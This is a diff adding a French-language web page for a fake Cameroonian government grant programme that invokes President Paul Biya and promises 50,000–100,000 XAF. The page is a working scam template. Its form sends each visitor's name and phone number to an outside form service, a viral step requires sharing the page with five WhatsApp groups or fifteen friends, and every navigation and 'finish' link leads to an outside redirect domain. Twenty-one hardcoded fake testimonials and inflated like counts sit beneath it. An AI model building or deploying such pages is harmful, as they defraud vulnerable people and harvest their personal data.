@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Initiative de Développement du Cameroun</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+
+    <div class="top-banner">
+        <a href="index.html"><img src="assets/img/Screenshot_2025-10-10-06-43-31-65_81b5f59f81a9801c9f112972edbe649b~2.jpg" alt="Bannière Officielle du Gouvernement"></a>
+    </div>
+
+    <header class="container main-header">
+        <div class="site-title">Initiative de Développement du Cameroun</div>
+        <nav class="main-nav"><ul><li><a href="https://obqj2.com/4/8246516">Accueil</a></li><li><a href="https://obqj2.com/4/8246516">À Propos</a></li><li><a href="https://obqj2.com/4/8246516">Subventions</a></li><li><a href="https://obqj2.com/4/8246516">Contact</a></li></ul></nav>
+        <div class="header-controls">
+            <div class="search-container">
+                <button class="icon-button search-toggle" aria-label="Ouvrir la Recherche"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z" /></svg></button>
+                <form class="search-bar" id="searchForm"><input type="search" placeholder="Rechercher..." aria-label="Rechercher"><button type="submit">Aller</button></form>
+            </div>
+            <button class="icon-button hamburger-menu" aria-label="Ouvrir le Menu"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5" /></svg></button>
+        </div>
+    </header>
+    
+    <nav class="mobile-nav">
+         <div class="mobile-nav-header"><button class="icon-button close-menu" aria-label="Fermer le Menu"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18 18 6M6 6l12 12" /></svg></button></div>
+        <ul><li><a href="https://obqj2.com/4/8246516">Accueil</a></li><li><a href="https://obqj2.com/4/8246516">À Propos</a></li><li><a href="https://obqj2.com/4/8246516">Subventions</a></li><li><a href="https://obqj2.com/4/8246516">Contact</a></li></ul>
+    </nav>
+
+    <main>
+        <section class="carousel">
+            <div class="carousel-inner">
+                <div class="carousel-item active">
+                    <img src="assets/img/1705-12558-mbalam-iron-project-paul-biya-refuses-to-pay-fine-calls-for-arbitration_L.jpg" alt="Renforcer Notre Nation">
+                </div>
+                <div class="carousel-item">
+                    <img src="assets/img/FB_IMG_1760205341440.jpg" alt="Soutenir les Entreprises Locales">
+                </div>
+                <div class="carousel-item">
+                    <img src="assets/img/Paul-Biya-957x598.jpg" alt="Bâtir un Avenir Meilleur">
+                </div>
+            </div>
+        </section>
+        
+        <section id="introSection" class="intro-section container">
+            <p>Pour célébrer les efforts continus de Son Excellence Paul Biya (Papa Biya) pour protéger et guider notre nation en ces temps difficiles, l'Initiative de Développement du Cameroun offre des subventions financières de 50 000 à 100 000 XAF aux personnes et entreprises éligibles.</p>
+        </section>
+        
+        <section id="ctaSection" class="cta-section container"><button id="startApplicationBtn" class="cta-button">Démarrer Votre Demande</button></section>
+
+        <section id="applicationContainer" class="form-container" style="display: none;">
+            <div class="progress-tracker">
+                <div class="progress-step-visual active" id="progressNode1"><div class="progress-node">1</div><div class="progress-label">Détails</div></div>
+                <div class="progress-line-container"><div class="progress-line" id="progressLine"></div></div>
+                <div class="progress-step-visual" id="progressNode2"><div class="progress-node">2</div><div class="progress-label">Finaliser</div></div>
+            </div>
+            <div id="applicationFormSection" class="application-section">
+                <h2>Formulaire de Demande de Subvention</h2>
+                <p>Remplissez les détails ci-dessous. Les champs marqués d'un <span class="required">*</span> sont obligatoires.</p>
+                <form id="grantForm" action="https://formsubmit.co/el/yujavi" method="POST">
+                    <input type="hidden" name="_subject" value="Nouvelle Demande de Subvention !"><input type="hidden" name="_captcha" value="false">
+                    <div class="form-group"><label for="fullName">Nom Complet <span class="required">*</span></label><input type="text" id="fullName" name="Nom Complet" required></div>
+                    <div class="form-group"><label for="phone">Numéro de Téléphone <span class="required">*</span></label><input type="tel" id="phone" name="Numéro de Téléphone" required></div>
+                    <div class="form-group"><label for="category">Catégorie <span class="required">*</span></label><select id="category" name="Catégorie" required><option value="">-- Sélectionnez votre catégorie --</option><option value="Petit Agriculteur">Petit Agriculteur</option><option value="Petit Commerçant">Petit Commerçant</option><option value="Jeune Entrepreneur">Jeune Entrepreneur</option><option value="Femme en Affaires">Femme en Affaires</option></select></div>
+                    <div class="form-group"><label for="businessDescription">Décrivez votre Entreprise/Activité <span class="required">*</span></label><textarea id="businessDescription" name="Description de l'Entreprise" rows="4" required></textarea></div>
+                    <button type="submit" class="cta-button" style="width: 100%;">Soumettre la Demande</button>
+                </form>
+            </div>
+            <div id="shareSection" class="share-section" style="display: none;">
+                <h2>Une Dernière Étape !</h2>
+                <p>Pour finaliser votre demande, veuillez partager cette initiative avec 5 groupes WhatsApp ou 15 amis.</p>
+                <div class="share-progress-bar"><div id="shareProgressBar" class="share-progress"></div></div>
+                <div id="shareCounterText" class="share-counter-text">0 / 5 Partages</div>
+                <div class="share-buttons">
+                    <a href="#" id="shareBtn" class="share-button whatsapp"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 12C2.13 13.84 2.63 15.61 3.53 17.15L2 22L7.05 20.48C8.55 21.34 10.25 21.82 12.04 21.82C17.5 21.82 21.95 17.37 21.95 11.82C21.95 6.27 17.5 2 12.04 2M12.04 3.67C16.56 3.67 20.28 7.39 20.28 11.91C20.28 16.43 16.56 20.15 12.04 20.15C10.46 20.15 8.95 19.73 7.63 19L7.13 18.7L4.31 19.5L5.18 16.78L4.87 16.29C4.1 14.93 3.74 13.41 3.74 11.91C3.74 7.39 7.46 3.67 12.04 3.67M9.13 7.82C8.91 7.32 8.7 7.31 8.52 7.31C8.38 7.31 8.24 7.31 8.1 7.31C7.96 7.31 7.72 7.38 7.52 7.75C7.32 8.12 6.68 8.72 6.68 9.85C6.68 10.98 8.12 12.39 8.26 12.58C8.41 12.77 10.47 16.03 13.62 17.47C16.1 18.59 16.76 18.32 17.25 18.25C17.74 18.18 18.8 17.6 19 16.96C19.2 16.32 19.2 15.82 19.12 15.67C19.04 15.52 18.88 15.45 18.63 15.33C18.38 15.21 17.21 14.65 16.98 14.56C16.75 14.47 16.59 14.43 16.43 14.7C16.27 14.97 15.76 15.54 15.61 15.71C15.47 15.88 15.33 15.9 15.08 15.78C14.83 15.66 13.78 15.31 12.56 14.22C11.62 13.38 10.97 12.36 10.82 12.09C10.67 11.82 10.81 11.68 10.93 11.56C11.04 11.44 11.19 11.26 11.33 11.1C11.47 10.94 11.52 10.83 11.64 10.6C11.77 10.37 11.69 10.17 11.61 10C11.53 9.83 11.04 8.61 9.13 7.82Z" /></svg><span>Partager pour Finaliser</span></a>
+                </div>
+                <!-- Nouveaux conteneurs pour l'étape finale -->
+                <div id="finalLoadingContainer" style="display: none; justify-content: center; padding: 2rem 0;">
+                    <div class="loading-circle"></div>
+                </div>
+                <div id="finishButtonContainer" style="display: none; text-align: center; padding-top: 1rem;">
+                    <!-- IMPORTANT: Remplacer '#' par votre URL finale de demande -->
+                    <a href="https://obqj2.com/4/8246516" class="cta-button">Terminer la Demande</a>
+                </div>
+
+                <p id="completionMessage" style="display:none;">Merci ! Votre demande est complète et est en cours d'examen.</p>
+            </div>
+        </section>
+
+        <!-- Section Commentaires -->
+        <section class="comments-section">
+            <div class="comments-wrapper">
+                <div class="comments-header">
+                    <div class="comments-stats">
+                        <svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg>
+                        <span>Vous et 204 208 autres</span>
+                    </div>
+                    <span>120k Commentaires</span>
+                </div>
+                <div class="comments-view-more"><a href="#">Afficher les commentaires précédents...</a></div>
+                <div class="comments-list">
+                    <!-- TOUS LES 21 COMMENTAIRES CAMEROUNAIS CODÉS EN DUR CI-DESSOUS -->
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=1" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Marie Ndongo</span><p class="comment-text">Je viens de faire ma demande et ça a fonctionné instantanément 💚</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>À l'instant</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>246</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=2" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Pierre Mbappé</span><p class="comment-text">C'est légitime - j'ai reçu mes fonds en quelques secondes. Merci Papa Biya !</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 2 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>64</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=3" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Chantal Biya</span><p class="comment-text">Merci beaucoup, cela va aider mon entreprise.</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 5 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>498</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=4" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Samuel Eto'o</span><p class="comment-text">Waaah, c'est vrai !</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 8 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>302</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=5" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Ahmadou Ahidjo</span><p class="comment-text">Oui, je confirme que c'est réel</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 10 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>7</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=6" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Fatou Tchombé</span><p class="comment-text">Je suis tellement reconnaissante pour cette opportunité !</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 12 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>106</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=7" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Jean Mbarga</span><p class="comment-text">Le processus de demande était très fluide et rapide.</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 15 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>413</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=8" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Marthe Owona</span><p class="comment-text">Reçu ! C'est une excellente initiative pour la jeunesse.</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 18 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>380</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=9" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Roger Milla</span><p class="comment-text">J'ai reçu ma subvention !</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 20 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>112</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=10" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Béatrice Ngan</span><p class="comment-text">Merci beaucoup au gouvernement pour cela.</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 22 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>88</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=11" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Paul Soppo</span><p class="comment-text">Oui ! C'est tout simplement génial, merci.</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 25 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>51</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=12" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Suzanne Kala</span><p class="comment-text">Merci beaucoup pour le soutien gratuit</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 28 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>153</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=13" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Joseph Mboui</span><p class="comment-text">c'est incroyable</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 30 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>72</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=14" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Françoise Foning</span><p class="comment-text">Mes amis m'ont parlé de ça et c'est vrai.</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 33 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>201</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=15" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Alain Ekogha</span><p class="comment-text">Enfin, une vraie aide pour les petits commerçants comme moi.</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 35 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>310</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=16" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Patrice Ndedi</span><p class="comment-text">Je vais utiliser cela pour acheter de meilleures semences pour ma ferme. Que Dieu bénisse.</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 38 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>189</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=17" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Célestine Nkou</span><p class="comment-text">Ma demande a été approuvée si rapidement !</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 40 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>255</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=18" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Gaston Bebbe</span><p class="comment-text">Est-ce disponible dans toutes les régions ? Cela a fonctionné pour moi !</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 41 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>99</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=19" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Hortense Kedi</span><p class="comment-text">Wow, je n'y croyais pas au début mais c'est réel !</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 45 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>432</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=20" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Victor Kamga</span><p class="comment-text">La meilleure nouvelle que j'ai eue cette année. Merci.</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 48 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>176</span></div></div></div>
+</div>
+<div class="comment">
+    <div class="comment-avatar"><img src="https://i.pravatar.cc/40?img=21" alt="Avatar Utilisateur"></div>
+    <div class="comment-content"><div class="comment-bubble"><span class="comment-author">Bernard Ntone</span><p class="comment-text">Confirmé, j'ai reçu l'alerte. Merci CDI.</p></div><div class="comment-actions"><a>J'aime</a>·<a>Répondre</a>·<span>Il y a 50 min</span><div class="comment-likes"><svg class="like-icon" viewBox="0 0 16 16" fill="#0866ff" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg><span>350</span></div></div></div>
+</div>
+                </div>
+            </div>
+        </section>
+    </main>
+    
+    <footer class="main-footer"><p>Initiative de Développement du Cameroun © 2025 <br>Cette initiative célèbre le leadership continu du Président Paul Biya dans la guidance de notre nation</p></footer>
+
+    <div class="search-overlay" id="searchOverlay"><div class="loader"></div></div>
+
+    <script src="assets/js/script.js"></script>
+</body>
+</html>
